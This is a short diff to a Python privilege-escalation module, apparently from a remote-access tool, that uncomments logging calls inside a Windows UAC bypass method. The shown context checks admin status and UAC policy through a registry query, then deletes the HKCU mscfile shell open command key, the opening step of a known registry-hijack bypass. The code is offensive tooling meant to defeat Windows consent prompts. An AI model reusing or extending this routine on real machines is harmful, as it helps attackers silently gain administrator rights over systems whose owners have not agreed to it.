@@ -1,5 +1,6 @@
 from misc import misc
 from execute import execute
+import logging
 from common import *
 
 class Privilege_Escalation:
@@ -11,17 +12,17 @@ class Privilege_Escalation:
 		
 	@windows_only
 	def bypass_uac(self):
-		##logging.info("Attempting to bypass UAC.")
+		logging.info("Attempting to bypass UAC.")
 		if misc.isadmin():
-			##logging.debug("UAC bypass failed: Process already has admin privileges.")
+			logging.debug("UAC bypass failed: Process already has admin privileges.")
 			return "[*]You already have admin privileges!" # Check your privilege!
 		 
 		if not misc.is_user_in_group(misc.name_of_admin_group(), getpass.getuser()):
-			##logging.debug("UAC bypass failed: Current user is not part of admin group.")
+			logging.debug("UAC bypass failed: Current user is not part of admin group.")
 			return "[-]Current user is not part of admin group."
 		 
 		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5":
-			##logging.debug("UAC bypass failed: UAC on wrong notification policy.")
+			logging.debug("UAC bypass failed: UAC on wrong notification policy.")
 			return "[-]UAC is disabled or notification policy is set to 'Always'"
 			
 		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
